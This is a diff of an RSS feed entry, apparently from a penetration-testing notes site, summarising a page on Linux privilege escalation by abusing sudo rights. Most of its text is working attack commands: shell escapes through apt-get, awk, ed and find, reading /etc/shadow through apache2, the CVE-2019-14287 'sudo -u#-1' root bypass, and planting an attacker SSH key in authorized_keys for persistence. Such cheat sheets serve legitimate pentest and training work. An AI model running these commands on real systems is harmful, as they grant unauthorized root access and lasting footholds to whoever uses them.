@@ -27,7 +27,8 @@ Recon and Enumeration # Look for strange process ps aux # Look for setuid progra
       
       <guid>/linux-systems/privilege-escalation/abusing_sudo_rights/</guid>
       <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ 
-Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /etc/shadow # You will get an error and it will # display first line   apt-get sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    awk sudo awk &amp;lsquo;BEGIN {system(&amp;ldquo;/bin/sh&amp;rdquo;)}&amp;rsquo;    ed sudo /usr/bin/ed !/bin/sh    find sudo find /etc/passwd -exec /bin/sh \; sudo find /bin -name nano -exec /bin/sh \;    ftp sudo ftp ftp&amp;gt; /!</description>
+CVE 2019-14287 # Exploitable when a user have the following permissions (sudo -l) (ALL, !root) ALL # If you have a full TTY, you can exploit it like this sudo -u#-1 /bin/bash # If no TTY, you can restart SSH server and add your key sudo /etc/init.d/ssh restart echo &amp;#39;ssh-rsa AAAA[...snip...]fd48as= root@kali-jms&amp;#39; &amp;gt; authorized_keys sudo -u#-1 bash 
+Exploiting sudo    Binary program Commands Infos     apache2 sudo apache2 -f /etc/shadow # You will get an error and it will # display first line   apt-get sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    awk sudo awk &amp;lsquo;BEGIN {system(&amp;ldquo;/bin/sh&amp;rdquo;)}&amp;rsquo;    ed sudo /usr/bin/ed !</description>
     </item>
     
     <item>
